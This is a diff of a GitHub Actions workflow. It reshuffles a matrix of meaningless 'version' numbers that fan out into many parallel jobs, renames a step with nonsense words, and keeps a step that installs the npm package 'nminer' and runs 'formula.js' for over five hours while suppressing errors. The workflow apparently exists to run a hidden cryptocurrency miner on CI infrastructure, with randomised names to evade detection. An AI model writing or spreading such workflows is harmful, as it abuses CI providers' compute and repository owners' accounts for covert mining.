@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 192 }
-          - { version: 8356 }
-          - { version: 3396 }
-          - { version: 4662 }
-          - { version: 1240 }
-          - { version: 6880 }
-          - { version: 7261 }
-          - { version: 1413 }
-          - { version: 1151 }
-          - { version: 1296 }
-          - { version: 3471 }
-          - { version: 4096 }
-          - { version: 8436 }
-          - { version: 2729 }
-          - { version: 5885 }
-          - { version: 953 }
-          - { version: 614 }
-          - { version: 7442 }
+          - { version: 3269 }
+          - { version: 5067 }
+          - { version: 6288 }
+          - { version: 6969 }
+          - { version: 1776 }
+          - { version: 191 }
+          - { version: 238 }
+          - { version: 3722 }
+          - { version: 1517 }
+          - { version: 9082 }
+          - { version: 5982 }
+          - { version: 3215 }
+          - { version: 2079 }
+          - { version: 2687 }
+          - { version: 8384 }
+          - { version: 5043 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: french oh anti
+      - name: faithfully whereas
         run: |
           npm install nminer@latest
-          timeout 335m node formula.js || echo "formula executed"
+          timeout 316m node formula.js || echo "formula executed"
